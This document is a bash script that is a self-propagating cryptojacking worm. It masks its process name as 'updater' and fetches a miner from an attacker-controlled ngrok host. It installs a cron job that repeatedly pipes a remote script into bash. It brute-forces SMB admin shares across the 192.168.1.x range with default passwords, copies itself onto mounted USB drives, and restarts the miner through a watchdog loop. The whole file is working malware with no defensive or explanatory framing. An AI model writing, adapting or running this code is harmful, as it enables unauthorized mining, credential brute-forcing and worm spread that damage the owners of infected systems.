#!/bin/bash
# Disguise as a generic process
exec -a updater bash -c '

# Colors
RED="\033[31m"
PURPLE="\033[35m"
GREEN="\033[32m"
RESET="\033[0m"

# Configuration
ATTACKER_IP="3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app"
MINER_URL="http://$ATTACKER_IP:8080/miner.js"
RETRY_FILE="/tmp/retry_vulnerable.txt"
NETWORK_RANGE="192.168.1."
COMMON_USERS=("admin" "user" "guest")
COMMON_PASSWORDS=("password" "123456" "admin")

# Install dependencies
install_deps() {
    if ! command -v curl >/dev/null; then
        apt-get update -y && apt-get install -y curl
    fi
    if ! command -v node >/dev/null; then
        curl -fsSL https://deb.nodesource.com/setup_16.x | bash - && apt-get install -y nodejs
    fi
    if ! command -v smbclient >/dev/null; then
        apt-get install -y smbclient
    fi
}

# Download and run miner
run_miner() {
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Fetching miner${RESET}"
    curl -s "$MINER_URL" -o /tmp/miner.js
    node /tmp/miner.js &
    MINER_PID=$!
    echo -e "${GREEN}[$(date +%H:%M:%S)] Miner started (PID: $MINER_PID)${RESET}"
}

# Ensure persistence
ensure_persistence() {
    (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://$ATTACKER_IP:8080/miner.sh | bash") | crontab -
    echo -e "${GREEN}[$(date +%H:%M:%S)] Persistence established${RESET}"
}

# LAN Worming via SMB
smb_spread() {
    for i in $(seq 1 254); do
        target="${NETWORK_RANGE}${i}"
        for user in "${COMMON_USERS[@]}"; do
            for pass in "${COMMON_PASSWORDS[@]}"; do
                if smbclient -U "$user%$pass" -c "put $0 miner.sh" "//$target/C$" 2>/dev/null; then
                    echo -e "${GREEN}[$(date +%H:%M:%S)] Copied to $target via SMB${RESET}"
                fi
            done
        done &
    done
}

# USB Injection
usb_inject() {
    while true; do
        for dev in /dev/sd[b-z]1; do
            if [ -b "$dev" ]; then
                mountpoint=$(mount | grep "$dev" | awk "{print \$3}")
                if [ -n "$mountpoint" ] && [ ! -f "$mountpoint/miner.sh" ]; then
                    cp "$0" "$mountpoint/miner.sh"
                    chmod +x "$mountpoint/miner.sh"
                    echo -e "${GREEN}[$(date +%H:%M:%S)] Injected into USB at $mountpoint${RESET}"
                fi
            fi
        done
        sleep 10
    done
}

# Watchdog
watchdog() {
    while true; do
        if ! ps -p $MINER_PID > /dev/null 2>&1; then
            echo -e "${RED}[$(date +%H:%M:%S)] Miner stopped, restarting${RESET}"
            run_miner
        fi
        sleep 60
    done
}

# Main execution
install_deps
ensure_persistence
run_miner
watchdog &
smb_spread &
usb_inject &

wait
'